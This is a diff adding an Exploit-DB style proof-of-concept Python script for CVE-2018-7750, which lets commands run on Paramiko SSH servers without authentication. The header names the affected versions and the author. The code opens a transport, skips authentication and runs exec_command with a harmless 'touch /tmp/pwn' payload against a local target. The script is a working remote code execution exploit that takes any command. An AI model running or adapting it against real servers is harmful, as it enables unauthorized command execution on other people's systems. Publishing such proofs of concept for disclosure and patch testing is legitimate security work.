@@ -1,0 +1,32 @@
+# Exploit Title: Paramiko < 2.4.1 - Remote Code Execution
+# Date: 2018-11-06
+# Exploit Author: jm33-ng
+# Vendor Homepage: https://www.paramiko.org
+# Software Link: https://github.com/paramiko/paramiko/archive/2.4.0.tar.gz
+# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1
+# Tested on: Multiple platforms
+# CVE: CVE-2018-7750
+
+# This PoC provides a way to execute arbitrary commands via paramiko SSH server, using CVE-2018-7750.
+# Details about CVE-2018-7750: https://github.com/paramiko/paramiko/issues/1175
+# The original PoC, which makes use of SFTP, can be found at https://www.exploit-db.com/exploits/45712
+
+#!/usr/bin/python3
+import sys
+import paramiko
+
+host = '127.0.0.1'  # ip of paramiko ssh server target
+port = 2222
+cmd = "touch /tmp/pwn"
+
+trans = paramiko.Transport((host, port))
+trans.start_client()
+session = trans.open_session()
+
+try:
+    session.exec_command(cmd)
+    print("exec: ", cmd)
+except BaseException:
+    sys.exit(1)
+
+print("if you see this, you have exploited CVE-2018-7750")
